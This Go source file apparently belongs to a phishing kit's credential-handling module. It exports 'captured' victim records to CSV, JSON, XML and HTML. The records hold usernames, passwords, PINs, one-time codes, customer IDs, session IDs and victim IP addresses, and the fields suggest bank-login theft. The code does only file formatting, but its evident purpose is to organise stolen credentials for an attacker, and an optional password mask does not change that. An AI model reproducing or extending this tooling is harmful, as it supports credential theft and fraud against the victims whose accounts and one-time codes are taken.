package extract

import (
	"encoding/csv"
	"encoding/json"
	"fmt"
	"html"
	"os"
	"strings"
	"time"
)

// Exporter exports credentials to various formats
type Exporter struct {
	options ExportOptions
}

// NewExporter creates a new exporter
func NewExporter(options ExportOptions) *Exporter {
	return &Exporter{
		options: options,
	}
}

// ExportCredentials exports credentials to the specified format
func (ex *Exporter) ExportCredentials(credentials []Credential) error {
	switch ex.options.Format {
	case FormatCSV:
		return ex.exportCSV(credentials)
	case FormatJSON:
		return ex.exportJSON(credentials)
	case FormatXML:
		return ex.exportXML(credentials)
	case FormatHTML:
		return ex.exportHTML(credentials)
	default:
		return fmt.Errorf("unsupported format: %s", ex.options.Format)
	}
}

// exportCSV exports credentials to CSV format
func (ex *Exporter) exportCSV(credentials []Credential) error {
	file, err := os.Create(ex.options.OutputPath)
	if err != nil {
		return fmt.Errorf("failed to create file: %w", err)
	}
	defer file.Close()

	writer := csv.NewWriter(file)
	defer writer.Flush()

	// Write header
	header := []string{
		"Victim ID", "IP Address", "Username", "Email", "Password",
		"Customer ID", "PIN", "OTP", "User Agent", "Captured At", "Target", "Session ID",
	}
	if err := writer.Write(header); err != nil {
		return fmt.Errorf("failed to write header: %w", err)
	}

	// Write data
	for _, cred := range credentials {
		password := cred.Password
		if ex.options.MaskPasswords && password != "" {
			password = strings.Repeat("*", len(password))
		}

		row := []string{
			cred.VictimID, cred.IPAddress, cred.Username, cred.Email, password,
			cred.CustomerID, cred.PIN, cred.OTP, cred.UserAgent,
			cred.CapturedAt.Format(time.RFC3339), cred.Target, cred.SessionID,
		}
		if err := writer.Write(row); err != nil {
			return fmt.Errorf("failed to write row: %w", err)
		}
	}

	return nil
}

// exportJSON exports credentials to JSON format
func (ex *Exporter) exportJSON(credentials []Credential) error {
	if ex.options.MaskPasswords {
		for i := range credentials {
			if credentials[i].Password != "" {
				credentials[i].Password = strings.Repeat("*", len(credentials[i].Password))
			}
		}
	}

	file, err := os.Create(ex.options.OutputPath)
	if err != nil {
		return fmt.Errorf("failed to create file: %w", err)
	}
	defer file.Close()

	encoder := json.NewEncoder(file)
	encoder.SetIndent("", "  ")

	if err := encoder.Encode(credentials); err != nil {
		return fmt.Errorf("failed to encode JSON: %w", err)
	}

	return nil
}

// exportXML exports credentials to XML format
func (ex *Exporter) exportXML(credentials []Credential) error {
	file, err := os.Create(ex.options.OutputPath)
	if err != nil {
		return fmt.Errorf("failed to create file: %w", err)
	}
	defer file.Close()

	fmt.Fprintln(file, `<?xml version="1.0" encoding="UTF-8"?>`)
	fmt.Fprintln(file, `<credentials>`)

	for _, cred := range credentials {
		password := cred.Password
		if ex.options.MaskPasswords && password != "" {
			password = strings.Repeat("*", len(password))
		}

		fmt.Fprintf(file, "  <credential>\n")
		fmt.Fprintf(file, "    <victim_id>%s</victim_id>\n", html.EscapeString(cred.VictimID))
		fmt.Fprintf(file, "    <ip_address>%s</ip_address>\n", html.EscapeString(cred.IPAddress))
		fmt.Fprintf(file, "    <username>%s</username>\n", html.EscapeString(cred.Username))
		fmt.Fprintf(file, "    <email>%s</email>\n", html.EscapeString(cred.Email))
		fmt.Fprintf(file, "    <password>%s</password>\n", html.EscapeString(password))
		fmt.Fprintf(file, "    <customer_id>%s</customer_id>\n", html.EscapeString(cred.CustomerID))
		fmt.Fprintf(file, "    <captured_at>%s</captured_at>\n", cred.CapturedAt.Format(time.RFC3339))
		fmt.Fprintf(file, "    <target>%s</target>\n", html.EscapeString(cred.Target))
		fmt.Fprintf(file, "  </credential>\n")
	}

	fmt.Fprintln(file, `</credentials>`)
	return nil
}

// exportHTML exports credentials to HTML format
func (ex *Exporter) exportHTML(credentials []Credential) error {
	file, err := os.Create(ex.options.OutputPath)
	if err != nil {
		return fmt.Errorf("failed to create file: %w", err)
	}
	defer file.Close()

	// Write HTML header
	fmt.Fprintln(file, "<!DOCTYPE html>")
	fmt.Fprintln(file, "<html><head><title>Credential Export</title>")
	fmt.Fprintln(file, "<style>")
	fmt.Fprintln(file, "body { font-family: Arial, sans-serif; margin: 20px; }")
	fmt.Fprintln(file, "table { border-collapse: collapse; width: 100%; }")
	fmt.Fprintln(file, "th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }")
	fmt.Fprintln(file, "th { background-color: #4CAF50; color: white; }")
	fmt.Fprintln(file, "tr:nth-child(even) { background-color: #f2f2f2; }")
	fmt.Fprintln(file, ".masked { color: #999; }")
	fmt.Fprintln(file, "</style></head><body>")
	fmt.Fprintf(file, "<h1>Captured Credentials</h1><p>Total: %d credentials</p>\n", len(credentials))
	fmt.Fprintln(file, "<table><tr>")
	fmt.Fprintln(file, "<th>Victim ID</th><th>IP Address</th><th>Username</th><th>Email</th>")
	fmt.Fprintln(file, "<th>Password</th><th>Customer ID</th><th>Captured At</th><th>Target</th>")
	fmt.Fprintln(file, "</tr>")

	for _, cred := range credentials {
		password := cred.Password
		passwordClass := ""
		if ex.options.MaskPasswords && password != "" {
			password = strings.Repeat("*", len(password))
			passwordClass = ` class="masked"`
		}

		fmt.Fprintln(file, "<tr>")
		fmt.Fprintf(file, "<td>%s</td>", html.EscapeString(cred.VictimID))
		fmt.Fprintf(file, "<td>%s</td>", html.EscapeString(cred.IPAddress))
		fmt.Fprintf(file, "<td>%s</td>", html.EscapeString(cred.Username))
		fmt.Fprintf(file, "<td>%s</td>", html.EscapeString(cred.Email))
		fmt.Fprintf(file, "<td%s>%s</td>", passwordClass, html.EscapeString(password))
		fmt.Fprintf(file, "<td>%s</td>", html.EscapeString(cred.CustomerID))
		fmt.Fprintf(file, "<td>%s</td>", cred.CapturedAt.Format("2006-01-02 15:04:05"))
		fmt.Fprintf(file, "<td>%s</td>", html.EscapeString(cred.Target))
		fmt.Fprintln(file, "</tr>")
	}

	fmt.Fprintln(file, "</table></body></html>")
	return nil
}
